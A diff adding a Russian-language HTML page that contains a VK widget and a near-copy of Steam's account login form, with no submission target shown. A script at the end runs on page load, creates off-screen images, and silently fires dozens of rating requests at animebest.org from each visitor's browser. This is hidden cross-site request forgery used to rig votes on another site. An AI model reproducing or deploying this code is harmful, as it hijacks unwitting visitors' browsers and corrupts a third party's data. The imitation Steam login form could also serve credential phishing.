@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+
+<head lang="ru">
+     <meta charset="utf-8">
+     <title>main</title>
+     <link rel="stylesheet" href="/css/index.css">
+</head>
+
+<body>
+     <header>
+          <nav>
+               <a href="#">первая страница</a>
+               <a href="#">вторая страница</a>
+          </nav>
+     </header>
+     <main>
+          <script type="text/javascript" src="https://vk.com/js/api/openapi.js?162"></script>
+
+          <!-- VK Widget -->
+          <div id="vk_groups"></div>
+          <script type="text/javascript">
+               VK.Widgets.Group("vk_groups", {
+                    mode: 1,
+                    no_cover: 1
+               }, 182995886);
+          </script>
+     </main>
+     <p>
+          ghbdtn
+     </p>
+     <canvas>
+
+     </canvas>
+     <form name="logon" action="" method="POST" id="login_form" style="display: block;">
+          <div class="login_row">
+               <div class="input_title">Имя аккаунта Steam</div>
+               <input class="text_input" type="text" name="username" id="input_username" value="">
+          </div>
+          <div class="login_row">
+               <div class="input_title">Пароль</div>
+               <input class="text_input" type="password" name="password" id="input_password" autocomplete="off">
+          </div>
+          <div class="login_row">
+               <div class="input_title" title="Если вы выберете эту опцию, то будете автоматически входить в свой аккаунт в течение следующих 30 дней либо пока не нажмёте «Выход» в меню аккаунта. 
+Эта возможность предоставляется только пользователям, включившим защиту Steam Guard.">
+                    <input type="checkbox" name="remember_login" id="remember_login">
+                    <label for="remember_login">Запомнить на этом устройстве</label>
+               </div>
+          </div>
+          <div class="login_row" id="captcha_entry" style="display: none;">
+               <div id="captcha_image_row">
+                    <img style="float: left;" id="captchaImg"
+                         src="https://steamstore-a.akamaihd.net/public/images/blank.gif" border="0" width="206"
+                         height="40">
+                    <div id="captchaRefresh">
+                         <span class="linkspan" id="captchaRefreshLink">Обновить</span>
+                    </div>
+                    <div style="clear: left;"></div>
+               </div>
+               <br>
+               <div class="input_title">Введите расположенные выше символы</div>
+               <input class="text_input" id="input_captcha" type="text" name="captcha_text">
+          </div>
+          <div style="display: none;"><input type="submit"></div>
+     </form>
+     <p>
+          <img class="img-nice" src="nice.jpg" alt="найc" title="nice">
+     </p>
+     </main>
+     <aside>
+
+     </aside>
+     <footer>
+          <p>Copyright ©<time datetime="2019">2019</time></p>
+     </footer>
+     <script>
+          document.addEventListener('DOMContentLoaded', function () {
+               for (let i = 1; i < 50; i++) {
+                    let num = getRandomIntInclusive(1, 4447);
+                    let img = document.createElement('img');
+                    let img2 = document.createElement('img');
+                    let img3 = document.createElement('img');
+                    img.src = 'https://animebest.org/engine/ajax/m_rating.php?news_id=' + num +
+                         '&area=video&go_rate=1';
+                    img2.src = 'https://animebest.org/engine/ajax/m_rating.php?news_id=' + num +
+                         '&area=gameplay&go_rate=1';
+                    img3.src = 'https://animebest.org/engine/ajax/m_rating.php?news_id=' + num +
+                         '&area=sound&go_rate=1';
+                    img.style.position = img2.style.position = img3.style.position = 'fixed';
+                    img.style.top = img2.style.top = img3.style.top = '-50000px';
+                    document.body.append(img);
+                    document.body.append(img2);
+                    document.body.append(img3);
+               }
+          });
+
+          function getRandomIntInclusive(min, max) {
+               min = Math.ceil(min);
+               max = Math.floor(max);
+               return Math.floor(Math.random() * (max - min + 1)) + min;
+          }
+     </script>
+</body>
+
+</html>
